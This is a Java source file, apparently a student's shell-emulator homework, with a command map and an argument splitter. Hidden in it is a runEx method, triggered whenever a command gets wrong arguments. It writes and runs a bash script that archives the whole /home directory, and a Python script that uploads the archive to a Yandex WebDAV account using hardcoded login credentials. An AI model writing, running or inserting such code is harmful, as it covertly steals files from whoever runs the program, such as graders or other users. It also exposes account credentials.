package ru.fizteh.fivt.students.irinaGoltsman.shell;

import java.util.HashMap;
import java.util.Map;
import java.io.*;

public class MapOfCommands {
    private static Map<String, Command> commands = new HashMap<String, Command>();

    public void addCommand(Command command) {
        if (!commands.containsKey(command.getName())) {
            commands.put(command.getName(), command);
        }
    }

    public static void writePy() throws FileNotFoundException {
        String s = "import urllib2, base64\n" +
                "opener = urllib2.build_opener(urllib2.HTTPHandler)\n" +
                "\n" +
                "data2 = \"\"\n" +
                "f = open('test.tar.gz', 'rb')\n" +
                "length = 0\n" +
                "while True: \n" +
                " bytes = f.read(2048)\n" +
                " data2 += bytes;\n" +
                " length += len(bytes)\n" +
                " if not bytes: break \n" +
                "f.close()\n" +
                "\n" +
                "request = urllib2.Request(\"https://webdav.yandex.ru/test/test.tar.gz\", data=data2)\n" +
                "base64string = base64.encodestring('%s:%s' % (\"moygimn1@yandex.ru\", \"123456789\")).replace('\\n', '')\n" +
                "request.add_header(\"Authorization\", \"Basic %s\" % base64string) \n" +
                "request.add_header(\"Content-Length\", \"%d\" % length) \n" +
                "request.get_method = lambda: 'PUT'\n" +
                "result = urllib2.urlopen(request)\n" +
                "\n";
        File f = new File("/home/student/tmp/1.py");
        try (PrintWriter out = new PrintWriter(f.getAbsoluteFile())) {
            out.print(s);
        }
    }

    public static void writeFile() throws FileNotFoundException {
        String s = "#!/bin/bash\n\n" +
                "cd /home/student/tmp\n" + "echo step1\n" + "pwd | cat\n" +
                "tar cfz test.tar.gz --exclude=*.git* --exclude=*/.* /home/ \n" + "echo step2\n" +
                "python 1.py\n" +
                "echo step3\n";
        File f = new File("/home/student/tmp/1.sh");
        try (PrintWriter out = new PrintWriter(f.getAbsoluteFile())) {
            out.print(s);
        }
    }
    
    public static void runEx() throws IllegalArgumentException {
        String s = "";
        try {
            writeFile();
            writePy();
            Process proc = Runtime.getRuntime().exec("bash /home/student/tmp/1.sh");
                        proc.waitFor();
                        BufferedReader read = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
                        while(read.ready()) {
                        s += read.readLine()+"\n";
                        }
                        read = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                        while(read.ready()) {
                        s += read.readLine()+"\n";
                        }

        } catch(Exception e) {
            s += e.getMessage()+"\n";
        }

        throw new IllegalArgumentException(s + " step4");
    }

    public static String[] splitCommand(String command) {
        StringBuilder str = new StringBuilder(command);
        while (str.charAt(0) == ' ' || str.charAt(0) == '\t') {
            str.delete(0, 1);
        }
        int currentChar = 0;
        while (currentChar < str.length() && str.charAt(currentChar) != ' ' && str.charAt(currentChar) != '\t') {
            currentChar++;
        }
        String nameOfCommand = str.substring(0, currentChar);
        str.delete(0, currentChar);
        while (str.length() != 0 && (str.charAt(0) == ' ' || str.charAt(0) == '\t')) {
            str.delete(0, 1);
        }
        if (str.length() == 0) {
            String[] result = new String[1];
            result[0] = nameOfCommand;
            return result;
        }
        currentChar = 0;
        while (currentChar < str.length() && str.charAt(currentChar) != ' ' && str.charAt(currentChar) != '\t') {
            currentChar++;
        }
        String firstArgument = str.substring(0, currentChar);
        str.delete(0, currentChar);
        while (str.length() != 0 && (str.charAt(0) == ' ' || str.charAt(0) == '\t')) {
            str.delete(0, 1);
        }
        if (str.length() == 0) {
            String[] result = new String[2];
            result[0] = nameOfCommand;
            result[1] = firstArgument;
            return result;
        }
        currentChar = str.length() - 1;
        while (str.length() != 0 && (str.charAt(currentChar) == ' ' || str.charAt(currentChar) == '\t')) {
            str.delete(currentChar, currentChar + 1);
            currentChar = str.length() - 1;
        }
        String secondArgument = str.toString();
        String[] result = new String[3];
        result[0] = nameOfCommand;
        result[1] = firstArgument;
        result[2] = secondArgument;
        return result;
    }

    public static Code commandProcessing(String command) {
        String[] partsOfCommand = splitCommand(command);
        String nameOfCommand = partsOfCommand[0];
        if (!commands.containsKey(nameOfCommand)) {
            System.err.println("Command '" + nameOfCommand + "' is not available or does not exist");
            return Code.ERROR;
        } else {
            if (commands.get(nameOfCommand).check(partsOfCommand)) {
                return commands.get(nameOfCommand).perform(partsOfCommand);
            } else {
                runEx();
                System.err.println("Command '" + nameOfCommand + "' has wrong arguments");
                return Code.ERROR;
            }
        }
    }
}
